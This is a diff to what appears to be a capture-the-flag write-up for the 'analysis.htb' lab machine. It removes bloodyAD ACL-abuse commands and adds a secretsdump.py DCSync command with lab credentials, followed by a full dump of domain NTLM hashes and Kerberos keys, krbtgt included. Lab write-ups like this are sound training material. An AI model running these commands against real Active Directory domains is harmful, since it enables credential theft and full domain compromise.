@@ -582,25 +582,77 @@ This user is now compromised!
 
 # Domain Admin!
 
-```python
-❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u soc_analyst -p 'Password123!' get writable
+![](Pasted%20image%2020261112180712.png)
 
-distinguishedName: CN=DC-ANALYSIS,OU=Domain Controllers,DC=analysis,DC=htb
-permission: CREATE_CHILD; WRITE
-OWNER: WRITE
-DACL: WRITE
-```
-
-I have a lot of permissions on a lot of different objects, but the one highlighted above will allow me to perform a DCSync attack
+I have DCSync rights over the domain
 
 ```python
-❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u soc_analyst -p 'Password123!' add genericAll 'CN=DC-ANALYSIS,OU=DOMAIN CONTROLLERS,DC=ANALYSIS,DC=HTB' 'soc_analyst'
-[+] soc_analyst has now GenericAll on CN=DC-ANALYSIS,OU=DOMAIN CONTROLLERS,DC=ANALYSIS,DC=HTB
+❯❯❯ secretsdump.py analysis.htb/'soc_analyst':'Password123!'@dc-analysis.analysis.htb
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrateur:500:aad3b435b51404eeaad3b435b51404ee:584d96946e4ad1ddfa4f8d7938faf91d:::
+Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8549ecd32b0253e9894a422299fe2466:::
+analysis.htb\jdoe:1103:aad3b435b51404eeaad3b435b51404ee:190193db2c6c6d69c60cf5af64447ce0:::
+analysis.htb\soc_analyst:1104:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+analysis.htb\cwilliams:1105:aad3b435b51404eeaad3b435b51404ee:ce88373ebd6d687eac0a405734a266aa:::
+analysis.htb\technician:1106:aad3b435b51404eeaad3b435b51404ee:ce88373ebd6d687eac0a405734a266aa:::
+analysis.htb\webservice:1107:aad3b435b51404eeaad3b435b51404ee:780b446d7d76a85880ce49a387f18642:::
+analysis.htb\wsmith:1109:aad3b435b51404eeaad3b435b51404ee:3da4104738938858384180964346fc6c:::
+analysis.htb\jangel:1110:aad3b435b51404eeaad3b435b51404ee:eea7337a28121aab144ca78fed48fc7e:::
+analysis.htb\lzen:1111:aad3b435b51404eeaad3b435b51404ee:eea7337a28121aab144ca78fed48fc7e:::
+analysis.htb\svc_web:2101:aad3b435b51404eeaad3b435b51404ee:cf74f3b0e86e17fba5051e261b9785b2:::
+analysis.htb\amanson:2103:aad3b435b51404eeaad3b435b51404ee:5d5b796cd37d9e19d9d1ae10c22ffa78:::
+analysis.htb\badam:2104:aad3b435b51404eeaad3b435b51404ee:5d5b796cd37d9e19d9d1ae10c22ffa78:::
+DC-ANALYSIS$:1000:aad3b435b51404eeaad3b435b51404ee:2ec9198220c4bb7306ba170b7fa007f9:::
+[*] Kerberos keys grabbed
+Administrateur:aes256-cts-hmac-sha1-96:bbdd381cd3bc059becb24d603835c6662d2ff859d14a89321b06a9bd40d9ceb2
+Administrateur:aes128-cts-hmac-sha1-96:b763721d205511501d4437bb0d533f24
+Administrateur:des-cbc-md5:8a1625866dc70e3e
+krbtgt:aes256-cts-hmac-sha1-96:1abd47b37046d58f09c6055dd72500cf21b2b03accd94da127940dc8cf68e966
+krbtgt:aes128-cts-hmac-sha1-96:64843f096cfa7f3c0428af5d7fa0a111
+krbtgt:des-cbc-md5:761567bcb95efbb6
+analysis.htb\jdoe:aes256-cts-hmac-sha1-96:a15a171f672d2fa8bf8ce806494181be800e9ac5caad738d0245e8c517439a1f
+analysis.htb\jdoe:aes128-cts-hmac-sha1-96:788137e18d102667846dfa6e799f5605
+analysis.htb\jdoe:des-cbc-md5:c8196438920d735e
+analysis.htb\soc_analyst:aes256-cts-hmac-sha1-96:d179cba29dda935ca29251d28f60dadb2530af794e3d5e531f8cd87715022e43
+analysis.htb\soc_analyst:aes128-cts-hmac-sha1-96:10a709cb916d12c7827f6a4d3b836805
+analysis.htb\soc_analyst:des-cbc-md5:34da689b520708d5
+analysis.htb\cwilliams:aes256-cts-hmac-sha1-96:c9593639b6326f5ce6e5f8f63a1f493931e82e0cf36fff522f3fff18f484232d
+analysis.htb\cwilliams:aes128-cts-hmac-sha1-96:e6c7d165d9d078358a6796f9d6f13a0b
+analysis.htb\cwilliams:des-cbc-md5:07673ef7346b29f2
+analysis.htb\technician:aes256-cts-hmac-sha1-96:5cfa84dbca17274a487ec34ad10a93565a32598703fcc6dd203250cb00db946a
+analysis.htb\technician:aes128-cts-hmac-sha1-96:808a03bc4f37861c7b6d6ed52800021f
+analysis.htb\technician:des-cbc-md5:734938bad351a762
+analysis.htb\webservice:aes256-cts-hmac-sha1-96:e5615b5e42c227f8c1ab12e579d5f7057b982db8c6ba0f86d59a6abb9a07c261
+analysis.htb\webservice:aes128-cts-hmac-sha1-96:9fdbcf938b8f23c4a1e1114a3f443f44
+analysis.htb\webservice:des-cbc-md5:e0a13ddcc87fad23
+analysis.htb\wsmith:aes256-cts-hmac-sha1-96:45db99b88397594ea19c9db98ca07a001cd55a4dd08531d3174c2a9d429e6293
+analysis.htb\wsmith:aes128-cts-hmac-sha1-96:cafdd161311102f1a067f8fcc5e8749c
+analysis.htb\wsmith:des-cbc-md5:08d06d0834439229
+analysis.htb\jangel:aes256-cts-hmac-sha1-96:b89b8ce84087005e0b669004818e234170991841c2595f7e0a46f03f2e952c0c
+analysis.htb\jangel:aes128-cts-hmac-sha1-96:162b8089bf476738eac3944e4e9a9d26
+analysis.htb\jangel:des-cbc-md5:57a8c1f1ce0b6d52
+analysis.htb\lzen:aes256-cts-hmac-sha1-96:78ffd003e55ce649dee87d49696ffadf5a17228b1d9d500809c75a0ab571c623
+analysis.htb\lzen:aes128-cts-hmac-sha1-96:1c6ee5d1b0b25319ce3d13a14e6b4591
+analysis.htb\lzen:des-cbc-md5:7ca4c7ec08e5bfe6
+analysis.htb\svc_web:aes256-cts-hmac-sha1-96:a09012d0fbe163ec5121955080dbad809c10c62cfc164ccfbe71d6c88274d5a7
+analysis.htb\svc_web:aes128-cts-hmac-sha1-96:ef2aedddb1b0bb1fc4a07d52ef76e343
+analysis.htb\svc_web:des-cbc-md5:7f89b3313423eace
+analysis.htb\amanson:aes256-cts-hmac-sha1-96:bbeae2d8630e4e04de7b65960c6d243f7680c3afce36107153854dc9b228b86a
+analysis.htb\amanson:aes128-cts-hmac-sha1-96:736d14ea6c450158dd2b1a8ceb9a8935
+analysis.htb\amanson:des-cbc-md5:fdf4916ecd9e2fa2
+analysis.htb\badam:aes256-cts-hmac-sha1-96:4df01180b55c07481d2e0e1426c43017acfd838bfa00dfc30a499ca2ef5c8bcb
+analysis.htb\badam:aes128-cts-hmac-sha1-96:d67359146a7728035b90ed6406040639
+analysis.htb\badam:des-cbc-md5:970273ea406831b5
+DC-ANALYSIS$:aes256-cts-hmac-sha1-96:532379dc4c4ebb2a23effa772357a4d96db9b70935c9bf0b1f1a3d64b96a1584
+DC-ANALYSIS$:aes128-cts-hmac-sha1-96:55673951ee46d3712cc7f30ce16a72b6
+DC-ANALYSIS$:des-cbc-md5:3875f86d7a80b3e3
+[*] Cleaning up... 
 ```
 
-First ill abuse writedacl and add genericall over the domain controller
 
-```python
-
-```
 
